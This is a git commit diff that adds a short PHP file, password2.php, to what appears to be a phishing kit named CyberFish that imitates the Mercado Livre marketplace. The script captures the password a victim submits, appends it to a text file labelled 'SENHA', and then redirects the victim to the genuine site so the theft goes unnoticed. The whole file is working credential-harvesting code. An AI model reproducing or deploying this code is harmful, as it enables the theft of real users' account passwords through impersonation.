186476eeb348532eb82e12355135037970dc1a91
Cyber_Root0 <70926805+Cyber-Root0@users.noreply.github.com>
2021-01-12 21:54:25 -0300

    Add files via upload

---
+++ CyberFish/Mercado/password2.php
@@ -0,0 +1,12 @@
+﻿<?php
+$senha=$_POST['password']."\r\n";
+$suasenha="SENHA: ";
+$file = fopen("dados.txt","a");
+$escrever5=fwrite($file, $suasenha);
+$escrever6=fwrite($file, $senha);
+fclose($file);
+
+?>
+<script language="JavaScript"> 
+window.location="https://mercadolivre.com"; 
+</script> 
